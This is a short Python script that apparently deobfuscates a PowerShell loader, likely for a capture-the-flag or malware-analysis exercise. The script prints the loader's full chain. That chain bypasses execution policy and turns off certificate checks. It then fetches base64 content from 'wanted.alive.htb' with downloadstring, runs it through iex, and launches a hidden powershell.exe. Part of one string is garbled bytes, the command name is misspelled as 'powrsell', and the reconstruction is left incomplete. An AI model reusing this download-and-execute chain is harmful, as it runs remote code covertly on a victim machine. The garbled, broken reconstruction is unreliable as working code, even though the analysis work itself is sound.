import hashlib
import base64

# Define the strings
latifoliado = (
    "Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};[][Y77FVWB6W'f6UDvW%ӣ6V7W&G&F677FVWB6W'f݅ѕ(#ePointManager]::SecurityProtocol -bor 3072; iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((new-object system.net.webclient).downloadstring('http://wanted.alive.htb/cdba/_rp'))))"
)

parrana = ""

arran = (
    "    $Cod"
    "igo " + latifoliado + ""
    "$OWj"
    "uxd "
    "= [s"
    "yste"
    "m.Te"
    "xt.e"
    "ncod"
    "ing]"
    "::UT"
    "F8.G"
    "etSt"
    "ring"
    "([sy"
    "stem"
    ".Con"
    "vert"
    "]::F"
    "romb"
    "ase6"
    "4Str"
    "ing("
    "$cod"
    "igo)"
    ");po"
    "wers"
    "hell"
    ".exe"
    " -wi"
    "ndow"
    "styl"
    "e hi"
    "dden"
    " -ex"
    "ecut"
    "ionp"
    "olic"
    "y by"
    "pass"
    " -No"
    "Prof"
    "ile "
    "-com"
    "mand"
    " $OW"
    "juxD"
    # Add remaining concatenations here for full reconstruction
)

sandareso = (
    "po"
    "wr"
    "se"
    "ll -command "
)

# Emulate the descortinar function (substitute parrana with "")
# def descortinar(text, old, new):
#     return text.replace(old, new)

# # Clean the obfuscation
# arran = descortinar(arran, parrana, "")
# sandareso = descortinar(sandareso, parrana, "")
final_output = sandareso + arran

# decoded_bytes = base64.b64decode(final_output)
  # Decode bytes to string

print("Decoded String:")
print(final_output)
